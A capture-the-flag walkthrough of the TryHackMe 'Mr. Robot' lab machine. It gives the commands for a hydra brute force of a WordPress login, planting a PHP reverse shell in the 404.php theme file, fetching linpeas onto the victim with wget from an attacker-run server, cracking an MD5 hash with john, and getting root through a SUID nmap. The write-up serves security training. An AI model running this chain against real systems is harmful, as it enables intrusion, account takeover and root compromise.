Below are the steps to get the 3 flags on the Mr. Robot box on [TryHackMe](https://www.tryhackme.com).

First, let's run nmap with **nmap -sC -sV -O -T4 [machine ip]**. This will return ssh which is marked as closed, and both ports 80 and 443 which are open.

Launching both sites leads to the same terminal window which seems to have some of the propaganda from fsociety. Let's use gobuster to enumerate the webserver with **gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt**.

After a bit, several interesting results come up as shown below.

The hint for the first question also mentions **robots**, so let's look at **http://[machine ip]/robots.txt**. This leads to the following:

![Mr. Robot 3](/assets/img/MrRobot3.png)

Let's visit key-1-of-3.txt by going to **http://[machine ip]/key-1-of-3.txt**. This is where you will find the first key to this challenge.

![Mr. Robot 3 key1](/assets/img/MrRobot4.png)

Next, let's go to **http://[machine ip]/fsocity.dic**. This is a dictionary file with a huge list of words that may prove useful later on. The other useful thing we found was that this appears to be a WordPress site, so let's go to **http://[machine ip]/wp-login**. This brings you to a WordPress login page as expected.

WordPress contains a pretty poor security practice where it will tell you if a username does not exist. For example, I attempted with the user admin, and received this error message.

In a real world scenario, you would probably create a list of users with cewl based off of the website or use some other dictionary file, but in this case, I guessed a few characters from the television series, which led to **Elliot** being uncovered as the login name.

![Mr. Robot 7](/assets/img/MrRobot7.png)

Now that we had a username to login with, let's use hydra to brute force the password. The fsocity.dic file we saved earlier should be a good place to start, however, it has over 800,000 records in it. I assumed there were some duplicates, so I used sort and uniq to make it a more manageable list with. The command to run is **sort fsocity.dic\|uniq > UniquePasswords.txt**. This reduced the list down to around 11,000 unique entries and saved it to UniquePasswords.txt, which will run much quicker when brute forcing passwords. 

![Mr. Robot 8](/assets/img/MrRobot8.png)

The command to brute force in hydra is **hydra -l Elliot -P ~/Downloads/UniquePasswords.txt [machine ip] -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'**. This will return Elliot's password.

![Mr. Robot 9](/assets/img/MrRobot9.png)

Now that we have Elliot's password, let's login to the WordPress site. Once here, let's upload a reverse PHP shell. The one I recommend using is from [PentestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). Adjust the IP/Port to reflect your attacker machine's IP and the port you wish to connect with and save the shell. Next, let's click on **Appearance** followed by **Editor** on the left hand side. Choose one of the existing php files (I used **404.php**) to view it's contents, delete the contents of this file, and paste the reverse shell into that file.

![Mr. Robot 10](/assets/img/MrRobot10.png)

When done, click on **Update File** at the bottom of the file to save it. 

![Mr. Robot 11](/assets/img/MrRobot11.png)

On your attacker pc, run **nc -nvlp [port number]** where port number is the one selected in the php reverse shell earlier. Now, try to navigate to a random page to trigger a 404 error, which should launch the reverse shell.

![Mr. Robot 13](/assets/img/MrRobot13.png)

We now have a reverse shell. **whoami** reveals we are running as user **daemon** in the root directory. Let's navigate to home with **cd home** and run **ls** to view it's contents. There is a **robot** user folder here. Let's run **cd robot** followed by **ls** and we will see **key-2-of-3.txt** and **password.raw-md5**. **cat key-2-of-3.txt** will give you the 2nd key to this challenge, but we are not able to access it as daemon.

![Mr. Robot 14](/assets/img/MrRobot14.png)

Let's **cat** **password.raw-md5** and we will see that we have the hash for robot. 

![Mr. Robot 15](/assets/img/MrRobot15.png)

Let's copy and save this so we can crack it with john. Once you saved this locally (I saved it to a file called **robothash.txt**), run the following command: **john robothash.txt --format="Raw-MD5" -wordlist=/usr/share/wordlists/rockyou.txt**. Within a few moments you will crack this password. Raw-MD5 was selected as the format based on the extension in the file the hash came from (password.raw-md5).

![Mr. Robot 16](/assets/img/MrRobot16.png)

Since ssh is blocked, let's try to run **su robot** to swap from daemon to the robot user . We aren't able to because we're not running a TTY terminal.

![Mr. Robot 17](/assets/img/MrRobot17.png)

Let's run **python -c 'import pty; pty.spawn("/bin/sh")'** to upgrade our shell and run **su robot** again. Now we are able to swap over to robot with the password we uncovered with john.

![Mr. Robot 18](/assets/img/MrRobot18.png)

Let's run **cat key-2-of-3.txt** and we are able to uncover this flag.

![Mr. Robot 19](/assets/img/MrRobot19.png)

At this point, we need to enumerate to figure out how we are going to escalate privileges to root. On our attacker machine, lets serve up a python server with **python3 -m http.server**. Next, on our victim machine, run **cd /tmp** followed by **wget http://[your attacker ip]:8000/linpeas.sh** to download linpeas to the tmp directory of our victim. Next, run **chmod 777 linpeas.sh** to make it executable.

![Mr. Robot 20](/assets/img/MrRobot20.png)

Next, run **./linpeas.sh** to start enumerating the host. Partially through the script there is a list of SUID programs, and **nmap** stands out.

![Mr. Robot 21](/assets/img/MrRobot21.png)

Let's navigate to that folder with **cd /usr/local/bin** and run **nmap --help**. This is an older version of nmap (3.81), and it has an interactive mode that can be ran with the --interactive flag. 

![Mr. Robot 22](/assets/img/MrRobot22.png)

Let's run **nmap --interactive**. This is an old version of nmap, and this can be utilized to get a root shell since it is running as root due to the SUID flag. The command to run once in interactive mode is **!sh**

![Mr. Robot 23](/assets/img/MrRobot23.png)

Let's run **cd /root** followed by **ls**. You will see the 3rd key file there. Run **cat key-3-of-3.txt** to get the final key!
